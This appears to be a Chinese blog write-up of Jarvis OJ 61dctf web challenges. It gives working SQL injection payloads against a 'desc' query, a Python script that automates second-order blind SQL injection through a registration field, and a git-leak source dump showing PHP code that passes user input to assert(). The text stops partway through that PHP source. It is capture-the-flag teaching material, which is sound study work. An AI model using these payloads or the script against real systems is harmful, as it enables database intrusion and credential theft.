class="line">mysql&gt; desc users;</span><br><span class="line"><span class="code">+----------+</span>--------------<span class="code">+------+</span>-----<span class="code">+---------+</span>----------------+</span><br><span class="line">| Field    | Type         | Null | Key | Default | Extra          |</span><br><span class="line"><span class="code">+----------+</span>--------------<span class="code">+------+</span>-----<span class="code">+---------+</span>----------------+</span><br><span class="line">| Id       | int(11)      | NO   | PRI | NULL    | auto<span class="emphasis">_increment |</span></span><br><span class="line"><span class="emphasis">| username | varchar(255) | NO   |     |         |                |</span></span><br><span class="line"><span class="emphasis">| password | varchar(255) | NO   |     |         |                |</span></span><br><span class="line"><span class="emphasis">+----------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.01 sec)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">mysql&gt; desc `users`;</span></span><br><span class="line"><span class="emphasis">+----------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="emphasis">| Field    | Type         | Null | Key | Default | Extra          |</span></span><br><span class="line"><span class="emphasis">+----------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="emphasis">| Id       | int(11)      | NO   | PRI | NULL    | auto_</span>increment |</span><br><span class="line">| username | varchar(255) | NO   |     |         |                |</span><br><span class="line">| password | varchar(255) | NO   |     |         |                |</span><br><span class="line"><span class="code">+----------+</span>--------------<span class="code">+------+</span>-----<span class="code">+---------+</span>----------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc <span class="emphasis">'users'</span>;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '<span class="emphasis">'users'</span>' at line 1</span><br><span class="line">mysql&gt; desc "users";</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span class="emphasis">'"users"'</span> at line 1</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>以上我们可以看到<strong>desc table === desc `table`</strong>(反引号，这题所考察的)</p>
</li>
<li>引申出来可以知道<strong>desc `table1`  `table2`;</strong> 只要前者表存在，该语句是能执行的</li>
<li>根据源码可知,test表是存在的，且table是可控的，下面构造payload<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">查库:</span><br><span class="line">?table=test`  `union <span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:</span><br><span class="line"><span class="number">61</span>d300 </span><br><span class="line"></span><br><span class="line">查表:</span><br><span class="line">?table=test<span class="symbol">`  `</span><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x363164333030</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:</span><br><span class="line">secret_flag,secret_test</span><br><span class="line"></span><br><span class="line">查列:</span><br><span class="line">本来想直接如此:?table=test<span class="symbol">`  `</span><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> secret_flag</span><br><span class="line">发现被waf挡了,只能老实查列查内容</span><br><span class="line">?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=secret_flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">发现老是不回显想要的，一时间卡住了，后来直接不加<span class="keyword">where</span>语句就成了<span class="number">233</span></span><br><span class="line">?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:flagUwillNeverKnow</span><br><span class="line">#?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>这样也行</span><br><span class="line">#后面发现secret_flag改成<span class="number">0x7365637265745f666c6167</span>就行了~</span><br><span class="line"></span><br><span class="line">查内容:</span><br><span class="line">?table=test<span class="symbol">` `</span><span class="keyword">union</span> <span class="keyword">select</span> flagUwillNeverKnow <span class="keyword">from</span> secret_flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">回显:</span><br><span class="line">flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="61dctf-register"><a href="#61dctf-register" class="headerlink" title="[61dctf]register"></a>[61dctf]register</h1><p>题目入口：<a href="http://web.jarvisoj.com:32796/" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/</a><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hint1</span>: 二次注入</span><br><span class="line"></span><br><span class="line"><span class="attribute">Hint2</span>: register 二次注入在country</span><br></pre></td></tr></table></figure></p>
<ol>
<li>index.php是一个登陆界面，fuzzing没发现注入点</li>
<li>一波扫描</li>
</ol>
<table>
<thead>
<tr>
<th>URL</th>
<th>响应</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://web.jarvisoj.com:32796/test.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/test.php</a></td>
<td>200</td>
<td>NULL</td>
</tr>
<tr>
<td><a href="http://web.jarvisoj.com:32796/login.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/login.php</a></td>
<td>200</td>
<td>index.php</td>
</tr>
<tr>
<td><a href="http://web.jarvisoj.com:32796/config.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/config.php</a></td>
<td>200</td>
<td>空白页</td>
</tr>
<tr>
<td><a href="http://web.jarvisoj.com:32796/register.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/register.php</a></td>
<td>200</td>
<td>注册页</td>
</tr>
<tr>
<td><a href="http://web.jarvisoj.com:32796/hacker.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32796/hacker.php</a></td>
<td>200</td>
<td>waf页</td>
</tr>
</tbody>
</table>
<ol start="3">
<li>注册一波<blockquote>
<p>country=China&amp;username=jax&amp;password=123&amp;address=123</p>
</blockquote>
</li>
<li>根据提示找到country页面/index.php?page=info，发现</li>
</ol>
<table>
<thead>
<tr>
<th>Country</th>
<th>Address</th>
<th>Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>China</td>
<td>123</td>
<td>2019-09-18 19:41:21</td>
</tr>
</tbody>
</table>
<ol start="5">
<li>注入点在country,分别尝试’or’2’&lt;’1’#</li>
</ol>
<table>
<thead>
<tr>
<th>Country</th>
<th>Address</th>
<th>Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>&lt;’or\‘2\‘&lt;\‘1\‘#</td>
<td>123</td>
<td>2019-09-18 12:08:07</td>
</tr>
</tbody>
</table>
<ol start="6">
<li>基本是知道了语句的执行与否会带来时间的不同，大概是时区问题吧，正确就是北京时间，这样就是一个布尔盲注了</li>
<li>二次注入也是第一次接触，参考网上payload并分析一下<blockquote>
<p>‘ or ascii(substr((select group_concat(a) from(select 1,2,3`a`,4,5 union select * from users)`b`),1,1))&gt;0x19#</p>
</blockquote>
</li>
</ol>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">| Id | username | password |</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">|  1 | root     | root     |</span><br><span class="line">|  2 | admin    | admin    |</span><br><span class="line">|  3 | test     | test     |</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT GROUP<span class="emphasis">_CONCAT(a) FROM (SELECT 1,2,3`a` UNION SELECT * from users)`b`;</span></span><br><span class="line"><span class="emphasis">+-------------------+</span></span><br><span class="line"><span class="emphasis">| GROUP_</span>CONCAT(a)   |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">| 3,root,admin,test |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT GROUP<span class="emphasis">_CONCAT(a) FROM (SELECT 1,2,3 as `a` UNION SELECT * from users)as `b`;</span></span><br><span class="line"><span class="emphasis">+-------------------+</span></span><br><span class="line"><span class="emphasis">| GROUP_</span>CONCAT(a)   |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">| 3,root,admin,test |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT GROUP<span class="emphasis">_CONCAT(a) FROM (SELECT 1,2,3 as `a` UNION SELECT * from users);</span></span><br><span class="line"><span class="emphasis">ERROR 1248 (42000): Every derived table must have its own alias</span></span><br></pre></td></tr></table></figure>
<ol start="8">
<li><p>通过测试可知3 as `a` === 3`a` ,为什么这样，主要是因为country有长度限制，而后面的`b`则是语法问题需要如此</p>
</li>
<li><p>下面直接上脚本</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import datetime</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="keyword">start</span> = datetime.datetime.now()</span><br><span class="line">url0 = <span class="string">"http://web.jarvisoj.com:32796/index.php"</span></span><br><span class="line">url1 = <span class="string">"http://web.jarvisoj.com:32796/register.php"</span></span><br><span class="line">url2 = <span class="string">"http://web.jarvisoj.com:32796/login.php"</span></span><br><span class="line">url3 = <span class="string">"http://web.jarvisoj.com:32796/index.php?page=info"</span></span><br><span class="line"></span><br><span class="line">sqlquery = <span class="string">"SELECT GROUP_CONCAT(a) FROM (SELECT 1,2,3`a`,4,5 UNION SELECT * from users)`b`"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">result</span> = <span class="string">''</span></span><br><span class="line"><span class="keyword">num</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">length</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">finish</span> = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="keyword">check</span>():<span class="comment">#使用group_concat会出现,</span></span><br><span class="line">    <span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">result</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">','</span>:</span><br><span class="line">            <span class="keyword">count</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">count</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="keyword">finish</span>:</span><br><span class="line">    <span class="keyword">left</span> = <span class="number">0x19</span></span><br><span class="line">    <span class="keyword">right</span> = <span class="number">0x81</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="keyword">left</span> + <span class="keyword">right</span>) // <span class="number">2</span></span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">"country"</span>: <span class="string">"'or ASCII(SUBSTR((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;#"</span>.format(sqlquery, <span class="keyword">length</span>, <span class="keyword">mid</span>),</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"9Cy9Nus"</span>+<span class="keyword">str</span>(<span class="keyword">num</span>),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"123"</span>,</span><br><span class="line">            <span class="string">"address"</span>: <span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"9Cy9Nus"</span>+<span class="keyword">str</span>(<span class="keyword">num</span>),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">num</span> += <span class="number">1</span></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(url0)</span><br><span class="line">        s.post(url1, <span class="keyword">data</span>=data1)</span><br><span class="line">        s.post(url2, <span class="keyword">data</span>=data2)</span><br><span class="line">        res = s.get(url3)</span><br><span class="line">        <span class="built_in">text</span> = res.text</span><br><span class="line">        print data1[<span class="string">'country'</span>]</span><br><span class="line">        <span class="comment">#根据做题时间修改(一般错误是后退8小时)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;em&gt;2019-09-18 16'</span> <span class="keyword">in</span> <span class="built_in">text</span>:<span class="comment">#语句正确</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">mid</span> == <span class="keyword">left</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">left</span> == <span class="number">0x19</span>:</span><br><span class="line">                    <span class="comment">#finish = True</span></span><br><span class="line">                    break</span><br><span class="line">                print <span class="string">'result: '</span>+<span class="keyword">str</span>(<span class="keyword">left</span>)</span><br><span class="line">                <span class="keyword">result</span> += <span class="keyword">chr</span>(<span class="keyword">left</span>)</span><br><span class="line">                print <span class="keyword">result</span></span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">left</span> = <span class="keyword">left</span></span><br><span class="line">            <span class="keyword">right</span> = <span class="keyword">mid</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#语句正确</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">mid</span> == <span class="keyword">left</span>:</span><br><span class="line">                print <span class="string">'result: '</span>+<span class="keyword">str</span>(<span class="keyword">right</span>)</span><br><span class="line">                <span class="keyword">result</span> += <span class="keyword">chr</span>(<span class="keyword">right</span>)</span><br><span class="line">                print <span class="keyword">result</span></span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">left</span> = <span class="keyword">mid</span></span><br><span class="line">            <span class="keyword">right</span> = <span class="keyword">right</span></span><br><span class="line">    <span class="keyword">length</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">check</span>() == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">finish</span> = <span class="literal">True</span></span><br><span class="line">print <span class="keyword">result</span></span><br><span class="line"><span class="keyword">end</span> = datetime.datetime.now()</span><br><span class="line">print (<span class="keyword">end</span>-<span class="keyword">start</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9a73fd18fedd9643357ffe20b9d974e4</span></span><br><span class="line"><span class="comment"># CleverBoy</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>借鉴大佬的脚本，<del>其实就是直接用</del></p>
</li>
</ol>
<p><a href="https://www.cnblogs.com/sijidou/p/10573275.html" target="_blank" rel="noopener">参考1</a><br><a href="http://mitah.cn/index.php/archives/8/" target="_blank" rel="noopener">参考2</a></p>
<h1 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h1><p>题目入口：<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></p>
<blockquote>
<p>Hint1: 此题缺少关键解题文件的问题已修复。</p>
</blockquote>
<ol>
<li><p>?page=about</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">About</span></span><br><span class="line">昨儿做梦的时候我在梦里写了这个网站</span><br><span class="line"></span><br><span class="line">印象中我用了这些东西:</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line">GIT</span><br><span class="line"><span class="keyword">Bootstrap</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>看到git想到源码泄露<a href="https://www.freebuf.com/sectool/66096.html" target="_blank" rel="noopener">一个git泄露利用脚本</a></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">D:\小工具\githack\GitHack&gt;python GitHack<span class="selector-class">.py</span> http:<span class="comment">//web.jarvisoj.com:32798/.git</span></span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">index.php</span><br><span class="line">templates/about.php</span><br><span class="line">templates/contact.php</span><br><span class="line">templates/flag.php</span><br><span class="line">templates/home.php</span><br><span class="line">[Error] [Error <span class="number">183</span>] : u<span class="string">'web.jarvisoj.com_32798\\templates'</span></span><br><span class="line">[Error] [Error <span class="number">183</span>] : u<span class="string">'web.jarvisoj.com_32798\\templates'</span></span><br><span class="line">[OK] templates/flag.php</span><br><span class="line">[OK] index.php</span><br><span class="line">[OK] templates/home.php</span><br><span class="line">[OK] templates/contact.php</span><br><span class="line">[OK] templates/about.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功down下源码,主要代码index.php</p>
<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">if (isset($_GET['page'])) &#123;</span></span><br><span class="line"><span class="xml">	$page = $_GET['page'];</span></span><br><span class="line"><span class="xml">&#125; else &#123;</span></span><br><span class="line"><span class="xml">	$page = "home";</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">$file = "templates/" . $page . ".php";</span></span><br><span class="line"><span class="xml">assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="xml">assert("file_exists('$file')") or die("That file doesn't exist!");</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">?&gt;</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>My PHP Website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse navbar-fixed-top"</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    		<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbar"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-controls</span>=<span class="string">"navbar"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Project name<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"navbar"</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"home"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"about"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"contact"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=contact"</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">						<span class="comment">&lt;!--&lt;li &lt;?php if ($page == "flag") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top: 50px"</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">				require_once $file;</span></span><br><span class="line"><span class="xml">			?&gt;</span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-latest.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span 